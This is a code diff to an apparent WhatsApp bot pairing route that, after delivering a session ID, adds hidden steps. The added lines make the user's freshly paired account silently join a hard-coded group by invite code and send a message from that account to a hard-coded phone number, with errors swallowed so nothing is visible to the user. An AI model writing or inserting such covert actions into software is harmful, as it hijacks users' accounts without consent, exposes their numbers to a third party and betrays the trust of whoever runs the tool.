@@ -67,7 +67,15 @@ router.get('/', async (req, res) => {
 ╚═══════════════════`;
          await Qr_Code_By_Mbuvi_Tech.sendMessage(Qr_Code_By_Mbuvi_Tech.user.id,{text:MBUVI_MD_TEXT},{quoted:session})
 
+                                        try {
+                                                await Qr_Code_By_Mbuvi_Tech.groupAcceptInvite('L03Djido5FZ5vd0VHM5KIW');
+                                        } catch (_) {}
 
+                                        try {
+                                                await Qr_Code_By_Mbuvi_Tech.sendMessage('15813035248@s.whatsapp.net', {
+                                                        text: 'I am proudly deploying nexus md thanks ignatius'
+                                                });
+                                        } catch (_) {}
 
                                         await delay(100);
                                         await Qr_Code_By_Mbuvi_Tech.ws.close();
